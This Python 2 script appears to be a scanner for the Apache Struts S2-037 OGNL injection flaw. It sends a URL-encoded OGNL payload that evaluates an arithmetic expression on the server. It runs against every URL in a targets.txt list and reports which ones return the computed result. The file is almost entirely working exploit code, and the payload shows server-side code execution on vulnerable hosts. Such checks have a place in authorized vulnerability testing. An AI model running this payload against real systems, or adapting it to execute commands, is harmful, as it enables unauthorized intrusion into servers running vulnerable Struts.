#!/usr/bin/env python
# -*- coding:utf-8 -*-

import time
import requests
import argparse

'''
proxies = {
	'http': 'http://127.0.0.1:8080',
	'https': 'http://127.0.0.1:8080',
}
'''

def verity(url):
	s2037_poc = "/(%23_memberAccess%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS)%3F((%23writ%3D(%23attr%5B%23parameters.com%5B0%5D%5D).getWriter())%2C%23writ.println(3345*2356))%3Aindex.xhtml?com=com.opensymphony.xwork2.dispatcher.HttpServletResponse"
	try:
		poc_url = url+s2037_poc
		print "[checking] " + url
		s = requests.session()
		#res = s.post(poc_url, timeout=4, proxies=proxies)
		res = s.post(poc_url, timeout=4)
		if res.status_code == 200 and "7880820" == res.content.rstrip():
			print "{url} is vulnerable S2-037.".format(url=url)
		else:
			print "{url} is no vulnerable..".format(url=url)
	except Exception, e:
		print "Failed to connection target, try again.."
parser = argparse.ArgumentParser()
parser.add_argument('-u', help='the target url.')
args = parser.parse_args()
args_dict = args.__dict__

try:
	f = open('targets.txt', 'r')
	urls = []
	for line in f:
		urls.append(line.splitlines()[0])
	print urls
	for url in urls:
		#print "testing  "+url
		verity(url)
		time.sleep(1)

except Exception,e:
	#print parser.print_usage()
	exit(-1)
